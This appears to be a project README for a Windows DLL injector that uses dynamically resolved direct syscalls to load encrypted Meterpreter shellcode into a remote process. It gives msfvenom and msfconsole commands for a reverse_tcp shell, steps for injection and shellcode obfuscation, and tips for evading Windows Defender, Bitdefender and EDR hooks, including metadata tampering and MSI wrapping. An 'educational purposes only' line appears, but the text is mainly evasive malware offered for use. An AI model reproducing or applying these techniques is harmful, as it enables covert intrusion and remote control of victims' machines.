# Direct Syscall DLL Injection
<img src=media/dirsyscall-dll-inj-reshacked-msi.png align="left" width=350>

Dll injector in a remote process using direct system calls resolved dynamically from ntdll.dll, the Dll uses Syscalls to inject encrypted shellcode into the same process, undetected by Windows Defender and Bitdefender. 

This code is for educational purposes only, do not use it for any malicious or unauthorized activity.


# 💻 Code

Similar to the simple Process Injection using Syscalls i made earlier, this malware bypasses Windows Api and part of Native api by using direct syscalls, which are CPU instructions (mostly assembly) that transition from user mode to kernel mode. This bypasses AV hooks, EDRs, and reduces static IAT footprint.

Its a more advanced and stealthier version of my previous dll injector, which used Native api functions.

### 1) Listener and encrypted payload

- First i used the classic multi handler exploit to run the payload, alternatively you can just use the already set shellcode in the code (simple messagbox that says xd):
``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```

- The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its detected way more than the raw shellcode for some reason:
``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 

- Once we have the shellcode we load it into the ```encrypter.c```  file, where the binary data is converted into Base64, use a custom base64_chars set instead of the standard alphabet to obfuscate more, secondly XOR encryption is applied (single-byte key), and finally we convert it into a hexadecimal string. You can find the encrypting code [here](https://github.com/Hue-Jhan/Simple-shellcode-crypter) or you can use your own encryption, but remember not to use rsa or aes or similar encoding algorithms as they raise the entropy levels too much.

### 2) Injector

The injector loads the dynamic library onto disk, looks for a specific process and injects the library into it, remember to disable pre compiled headers like phc before compiling:

- First of all we put the malicious dll in the same folder as the injector, we create a resource file and its header and we set the dll as a resource of the injector;
- Secondly on the injector we locate the resource file, calculate its size, upload it to memory, and lock it for access so it can be used without being moved;
- Thirdly we extract the dll from the executable and write it to disk;
- We find a process by PID iterating through a pre-made linked list of ```SYSTEM_PROCESS_INFORMATION``` structs representing all running processes;
- We allocate memory the size of the dll path inside of it and write the path into the process;
- Then we get the handle to kernel32.dll and ntdll.dll and dynamically resolve the address of LoadLibraryA using ```LdrGetProcedureAddress```;
- Finally we create a thread that executes the function that loads the malicious dll;
- The Dll decodes the data and uploads it to memory, creating the shell;

The syscalls replace the classic WinApi and NativeApi functions: 

- First we read the ntdll.dll export table to find the offset for each syscall;
- In the assembly file you can find the stubs for each function, heres an example: ```mov eax, <syscall_number>```;
- Then we store the syscall numbers globally in ```injection.h```;
- Each variable stores the runtime-resolved number of every Nt* function;
- When using any function we just call the syscall: ```Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID)```;

### 3) DLL

The syscalls are used both in the DLL and in the injector, unlike ```kernel32.dll``` APIs like VirtualAllocEx, ```ntdll.dll``` functions are sometimes less likely to be hooked by EDRs at user level, because most interactions with the target are done via direct system calls resolved dynamically from ntdll.dll, we should theoreticall bypass any user-mode hooks.

- In order to use Ntdll and syscalls we create custom typedef structs for each function, and we define all the internal structures and objects that they need, sometimes structures may be nested and require even more internal objects;
- To avoid loader lock issues, a small thread is spawned immediately after the DLL being attached;
- When the library is attached to the process, it decodes the obfuscated shellcode, allocates memory for it, writes it into this memory chunk, and sets the correct permissions;
- Finally it creates a thread into the same process its being injected into and the previously uploaded shellcode will be executed.


# 🛡 AV Detection

This malware successfully bypasses Windows Defender and Bitdefender!!! 😊 yeee

But AVs look for certain patterns like creating a thread right after execution, so the exe is still detectable by strong AVs or industrial level firewalls...

Here's the DLL, the raw one and the one obfuscated by inserting ntdll metadata into it.

<img src=media/dirsyscall-dll.png align="left" width=300>

<img src=media/dirsyscall-dll-reshacked.png align="left" width=300>

Here's the injector, the raw one, the one obfuscated by inserting vs_community metadata into it, and the MSI wrapped version.

You can obfuscate it even more using tools like soggoth, or by turning it into an iso/linker file, or by using multiple stagers.

The raw one gets more detection than the classic process injection because it extracts the dll and writes it on disk, in the future i will try to inject it directly into the target process with a technique known as manual mapping.

<img src=media/dirsyscall-dll-inj.png align="left" width=300>

<img src=media/dirsyscall-dll-inj-reshacked.png align="left" width=300>

<img src=media/dirsyscall-dll-inj-reshacked-msi.png align="left" width=300>
